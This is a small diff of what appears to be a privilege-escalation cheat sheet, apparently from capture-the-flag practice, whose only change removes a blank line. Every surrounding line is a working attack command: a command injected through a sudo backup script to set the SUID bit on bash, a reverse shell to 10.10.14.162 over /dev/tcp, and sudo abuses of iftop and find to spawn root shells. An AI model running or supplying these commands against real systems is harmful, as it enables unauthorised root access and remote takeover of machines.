@@ -10,7 +10,6 @@ sudo /etc/mp3backups/backup.sh -c "chmod u+s /bin/bash"
 sudo bash -p
 bash -i &> /dev/tcp/10.10.14.162/1313 0>&1
 
-
 # suid - escalada de privilegios
 sudo /usr/sbin/iftop -->!sh
 sudo find . -exec /bin/sh \; -quit
